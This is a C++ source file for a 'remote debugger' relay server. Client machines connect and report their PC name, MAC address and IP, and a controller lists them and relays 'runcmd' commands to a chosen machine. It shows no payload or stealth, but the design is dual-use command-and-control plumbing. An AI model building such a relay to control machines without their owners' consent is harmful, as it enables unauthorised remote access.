// RemoteDebugerServer.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "..\iocp\IOCPExport.h"
#pragma comment(lib,"IOCP.lib")
#pragma comment(lib,"ws2_32.lib")

#include "..\公共\ProtocolHandler.h"

HANDLE hDebugerClientServer = NULL;
HANDLE hControllerClientServer = NULL;

typedef struct tagCLIENT_INFO{
	CStringA strPCName;
	CStringA strMacAddr;
	CStringA strWanIp;
}CLIENT_INFO,*PCLIENT_INFO;

VOID WINAPI DebugerClientConnectCallback( HANDLE hClient,sockaddr_in *psiClient )
{
	PCLIENT_INFO pClientInfo = new CLIENT_INFO;
	pClientInfo->strWanIp = inet_ntoa(psiClient->sin_addr);

	IOCPSetClientUserParam(hDebugerClientServer,hClient,pClientInfo);
}
VOID WINAPI DebugerClientDisConnectCallback( HANDLE hClient , PVOID pUserParam)
{
	if (pUserParam)
	{
		delete pUserParam;
	}
}

VOID WINAPI DebugerDataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,DWORD dwDataLen)
{
	CProtocolHandler ptlHandler;
	ptlHandler.ParseProtocolString((LPCSTR)pDataBuffer,dwDataLen);
	
	CStringA strCmd;
	strCmd = ptlHandler.GetParamValueString("cmd","");
	if (strCmd == "reportinfo")
	{
		PCLIENT_INFO pClientInfo = NULL;
		if ( pUserParam )
		{
			pClientInfo = (PCLIENT_INFO)pUserParam;
		}
		else
		{
			pClientInfo = new CLIENT_INFO;
			IOCPSetClientUserParam(hDebugerClientServer,hClient,pClientInfo);
		}

		pClientInfo->strPCName = ptlHandler.GetParamValueString("pcname","");
		pClientInfo->strMacAddr = ptlHandler.GetParamValueString("mac","");

	}
	else
	{
		HANDLE hCtrlClient = (HANDLE)ptlHandler.GetParamValueInt("target",0);
		if (hCtrlClient)
		{
			IOCPPostSendRequest(hControllerClientServer,hCtrlClient,pDataBuffer,dwDataLen,NULL);
		}
	}
}
/////////////////////////////////
VOID WINAPI ControllerConnectCallback( HANDLE hClient,sockaddr_in *psiClient )
{

}
VOID WINAPI ControllerClientDisConnectCallback( HANDLE hClient , PVOID pUserParam)
{

}

VOID WINAPI OnlineClientEnumCallBack( PVOID pParam , HANDLE hClient )
{
	list<HANDLE> *plstHandles = (list<HANDLE> *)pParam;
	plstHandles->push_back(hClient);
}
VOID WINAPI ControllerDataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,DWORD dwDataLen)
{
	CProtocolHandler ptlHandler;
	ptlHandler.ParseProtocolString((LPCSTR)pDataBuffer,dwDataLen);

	CString strCmd;
	strCmd = ptlHandler.GetParamValueString("cmd","");
	if (strCmd == L"getonlineclient")
	{
		CProtocolHandler ptlResponse;

		list<HANDLE> lstHandles;
		IOCPGetAllOnlineClient(hDebugerClientServer,OnlineClientEnumCallBack,&lstHandles);

 		ptlResponse.SetParamValueString("cmd","getonlineclient");
 		ptlResponse.SetParamValueInt("clientcount",lstHandles.size());
 
 		int nIndex = 0;
 		HANDLE hTempHandle = NULL;
 		for (list<HANDLE>::const_iterator it = lstHandles.begin();it!=lstHandles.end();it++)
 		{
 			hTempHandle = *it;
			
			PCLIENT_INFO pClientInfo = (PCLIENT_INFO)IOCPGetClientUserParam(hDebugerClientServer,hTempHandle);

 			CStringA strTempKeyName;
 			strTempKeyName.Format("client%d",nIndex);
 			ptlResponse.SetParamValueInt(strTempKeyName,(int)hTempHandle);
			
			if (pClientInfo)
			{
				strTempKeyName.Format("pcname%d",nIndex);
				ptlResponse.SetParamValueString(strTempKeyName,pClientInfo->strPCName);

				strTempKeyName.Format("mac%d",nIndex);
				ptlResponse.SetParamValueString(strTempKeyName,pClientInfo->strMacAddr);

				strTempKeyName.Format("wip%d",nIndex);
				ptlResponse.SetParamValueString(strTempKeyName,pClientInfo->strWanIp);
			}


 			nIndex++;
 		}
 
 		CStringA strResponse;
 		strResponse = ptlResponse.BuildData();
 
 		IOCPPostSendRequest(hControllerClientServer,hClient,(BYTE *)strResponse.GetBuffer(),strResponse.GetLength(),NULL);
	}

	if (strCmd == L"runcmd")
	{
		HANDLE hTargetClient = (HANDLE)ptlHandler.GetParamValueInt( "target", 0 );
		if (hTargetClient)
		{
			ptlHandler.SetParamValueInt("source",(int)hClient);
			CStringA strSendData;
			strSendData = ptlHandler.BuildData();

			IOCPPostSendRequest(hDebugerClientServer,hTargetClient,(BYTE *)strSendData.GetBuffer(),strSendData.GetLength(),NULL);
		}

	}

}

int _tmain(int argc, _TCHAR* argv[])
{
	IOCP_TCP_CALLBACK TcpCallback;
	TcpCallback.pClientConnect = DebugerClientConnectCallback ;
	TcpCallback.pClientDisConnect = DebugerClientDisConnectCallback ;
	TcpCallback.pDataRecv = DebugerDataRecvCallback;

	hDebugerClientServer = IOCPCreateTcpServer(8889,&TcpCallback);

	TcpCallback.pClientConnect = ControllerConnectCallback ;
	TcpCallback.pClientDisConnect = ControllerClientDisConnectCallback ;
	TcpCallback.pDataRecv = ControllerDataRecvCallback;

	hControllerClientServer = IOCPCreateTcpServer(8890,&TcpCallback);

	while (TRUE)
	{
		Sleep(1000);
	}


	return 0;
}

